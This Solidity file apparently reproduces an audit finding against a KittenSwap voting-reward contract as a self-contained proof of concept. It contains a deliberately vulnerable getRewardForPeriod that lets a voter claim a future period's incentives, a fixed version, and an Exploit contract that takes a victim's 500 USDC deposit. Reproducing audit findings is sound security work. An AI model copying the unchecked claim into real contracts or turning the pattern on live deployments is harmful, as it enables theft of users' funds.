// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  KittenSwap VotingReward — a voter can claim a still-open future period
    (Pashov Audit Group, C-03, 12 June 2025, finding 58067).
    SYNTHETIC, cheatcode-free. One transaction, no warp inside run().
    incentivize and _deposit both write getCurrentPeriod() + 1.
    getRewardForPeriod never checks that the period has arrived.
    Alice deposits 500 USDC for that next period. Bob is the only voter
    so far and claims it immediately, so Bob receives Alice's 500 USDC.
    The fixed claim reverts while the period is still in the future.
    After the period is the current one, the same 500 USDC is paid to Alice. */

abstract contract ReentrancyGuard {
    uint256 private constant NOT_ENTERED = 1;
    uint256 private constant ENTERED = 2;
    uint256 private status;

    constructor() {
        status = NOT_ENTERED;
    }

    modifier nonReentrant() {
        require(status != ENTERED, "reentrant");
        status = ENTERED;
        _;
        status = NOT_ENTERED;
    }
}

contract USDC {
    string public constant name = "USD Coin";
    string public constant symbol = "USDC";
    uint8 public constant decimals = 6;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        if (allowed != type(uint256).max) {
            require(allowed >= amount, "allow");
            allowance[from][msg.sender] = allowed - amount;
        }
        require(balanceOf[from] >= amount, "bal");
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Voter {
    mapping(address => bool) public isWhitelisted;

    function setWhitelisted(address token, bool allowed) external {
        isWhitelisted[token] = allowed;
    }

    function castVote(VotingReward rewards, uint256 amount, uint256 tokenId) external {
        rewards._deposit(amount, tokenId);
    }
}

contract VeKitten {
    mapping(uint256 => address) public ownerOf;

    function setOwner(uint256 tokenId, address owner) external {
        ownerOf[tokenId] = owner;
    }

    function isApprovedOrOwner(address spender, uint256 tokenId) external view returns (bool) {
        return ownerOf[tokenId] == spender;
    }
}

contract VotingReward is ReentrancyGuard {
    error NotWhitelistedRewardToken();
    error NotApprovedOrOwner();

    uint256 public constant WEEK = 7 days;

    Voter public voter;
    VeKitten public veKitten;

    mapping(uint256 => mapping(uint256 => uint256)) public tokenIdVotesInPeriod;
    mapping(uint256 => uint256) public totalVotesInPeriod;
    mapping(address => mapping(uint256 => uint256)) public tokenRewardsPerPeriod;
    mapping(uint256 => mapping(uint256 => mapping(address => bool))) public isRewardClaimed;

    modifier onlyVoter() {
        require(msg.sender == address(voter), "only voter");
        _;
    }

    constructor(Voter voter_, VeKitten veKitten_) {
        voter = voter_;
        veKitten = veKitten_;
    }

    function getCurrentPeriod() public view returns (uint256) {
        return block.timestamp / WEEK;
    }

    function _addReward(uint256 period, address token, uint256 amount) internal returns (uint256) {
        USDC(token).transferFrom(msg.sender, address(this), amount);
        tokenRewardsPerPeriod[token][period] += amount;
        return amount;
    }

    function earned(uint256 period, uint256 tokenId, address token) public view returns (uint256) {
        if (isRewardClaimed[period][tokenId][token]) return 0;
        uint256 total = totalVotesInPeriod[period];
        if (total == 0) return 0;
        return (tokenRewardsPerPeriod[token][period] * tokenIdVotesInPeriod[period][tokenId]) / total;
    }

    function _getReward(uint256 period, uint256 tokenId, address token, address receiver) internal {
        uint256 reward = earned(period, tokenId, token);
        isRewardClaimed[period][tokenId][token] = true;
        if (reward > 0) {
            USDC(token).transfer(receiver, reward);
        }
    }

    function incentivize(
        address _token,
        uint256 _amount
    ) external virtual nonReentrant {
        // Here we have one white list for token. So we cannot manipulate the token.
        if (voter.isWhitelisted(_token) == false)
            revert NotWhitelistedRewardToken();
        uint256 currentPeriod = getCurrentPeriod() + 1;
        uint256 amount = _addReward(currentPeriod, _token, _amount);
        amount;
    }

    function _deposit(uint256 _amount, uint256 _tokenId) external onlyVoter {
        uint256 nextPeriod = getCurrentPeriod() + 1;

        tokenIdVotesInPeriod[nextPeriod][_tokenId] += _amount;
        totalVotesInPeriod[nextPeriod] += _amount;
    }

    function getRewardForPeriod(
        uint256 _period,
        uint256 _tokenId,
        address _token
    ) external virtual nonReentrant {
        // Only owner or approved can get rewards.
        if (!veKitten.isApprovedOrOwner(msg.sender, _tokenId))
            revert NotApprovedOrOwner();
        // @> VULN: _period is not checked against getCurrentPeriod(), so the next period is claimable now
        _getReward(_period, _tokenId, _token, msg.sender);
    }
}

contract VotingRewardFixed is VotingReward {
    error FuturePeriod();

    constructor(Voter voter_, VeKitten veKitten_) VotingReward(voter_, veKitten_) {}

    function getRewardForPeriod(
        uint256 _period,
        uint256 _tokenId,
        address _token
    ) external override nonReentrant {
        if (_period > getCurrentPeriod()) revert FuturePeriod();
        if (!veKitten.isApprovedOrOwner(msg.sender, _tokenId)) revert NotApprovedOrOwner();
        _getReward(_period, _tokenId, _token, msg.sender);
    }
}

contract Victim {
    function fund(VotingReward rewards, USDC usdc, uint256 amount) external {
        usdc.approve(address(rewards), amount);
        rewards.incentivize(address(usdc), amount);
    }

    function vote(Voter voter, VotingReward rewards, uint256 amount, uint256 tokenId) external {
        voter.castVote(rewards, amount, tokenId);
    }

    function claim(VotingReward rewards, uint256 period, uint256 tokenId, address token) external {
        rewards.getRewardForPeriod(period, tokenId, token);
    }
}

contract Exploit {
    uint256 public constant TOKEN_ID = 1;
    uint256 public constant VOTES = 100;
    uint256 public constant AMOUNT = 500_000_000; // 500 USDC, the victim's deposit

    USDC public usdc; // nonce 1
    Voter public voter; // nonce 2
    VeKitten public ve; // nonce 3
    VotingReward public rewards; // nonce 4
    Victim public victim; // nonce 5

    uint256 public stolen;

    constructor() {
        usdc = new USDC();
        voter = new Voter();
        ve = new VeKitten();
        rewards = new VotingReward(voter, ve);
        victim = new Victim();
    }

    function run() external {
        voter.setWhitelisted(address(usdc), true);
        ve.setOwner(TOKEN_ID, address(this));
        usdc.mint(address(victim), AMOUNT);

        victim.fund(rewards, usdc, AMOUNT);
        voter.castVote(rewards, VOTES, TOKEN_ID);

        uint256 period = rewards.getCurrentPeriod() + 1;
        uint256 owed = rewards.earned(period, TOKEN_ID, address(usdc));
        rewards.getRewardForPeriod(period, TOKEN_ID, address(usdc));

        stolen = usdc.balanceOf(address(this));
        require(owed == AMOUNT, "not the victim amount");
        require(stolen == AMOUNT, "attacker was not paid the victim amount");
        require(usdc.balanceOf(address(victim)) == 0, "victim still holds it");
        require(usdc.balanceOf(address(rewards)) == 0, "incentive remains");
    }
}
